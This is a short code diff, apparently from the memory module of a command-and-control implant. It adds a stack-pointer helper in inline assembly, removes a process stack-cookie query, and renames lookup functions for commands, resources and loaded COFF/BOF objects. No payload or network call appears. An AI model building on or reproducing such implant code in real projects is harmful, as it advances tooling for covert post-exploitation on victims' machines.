@@ -12,6 +12,13 @@ using namespace Commands;
 namespace Memory {
     namespace Methods {
 
+	  __declspec(naked) UINT_PTR FindStackPointer() {
+		  __asm__ volatile(
+		      "mov %%rsp, %%rax\n"
+	          "ret"
+          );
+      }
+
         VOID ZeroFree(void **pointer, size_t size) {
             HEXANE;
 
@@ -25,18 +32,7 @@ namespace Memory {
             }
         }
 
-        UINT_PTR GetStackCookie() {
-            HEXANE;
-
-            UINT_PTR cookie = 0;
-            if (!NT_SUCCESS(ntstatus = ctx->procapi.NtQueryInformationProcess(NtCurrentProcess(), (PROCESSINFOCLASS) 0x24, &cookie, 0x4, nullptr))) {
-                return 0;
-            }
-
-            return cookie;
-        }
-
-        PRESOURCE GetIntResource(HMODULE base, CONST INT rsrc_id) {
+        PRESOURCE FindIntResource(HMODULE base, CONST INT rsrc_id) {
             HEXANE;
 
             HRSRC rsrc_info		= { };
@@ -132,7 +128,7 @@ namespace Memory {
                 return true;
             }
 
-            if (!(pointer = GetCommandAddress(cmd_id))) {
+            if (!(pointer = FindCommandAddress(cmd_id))) {
                 // LOG ERROR
                 return false;
             }
@@ -197,7 +193,7 @@ namespace Memory {
             // TODO: test that bof data size being zero is a correct way to do this
 
             if (!bof->data_size) {
-                saved = GetCOFF(bof->bof_id);
+                saved = FindCOFF(bof->bof_id);
 
                 bof->data      = saved->data;
                 bof->data_size = saved->data_size;
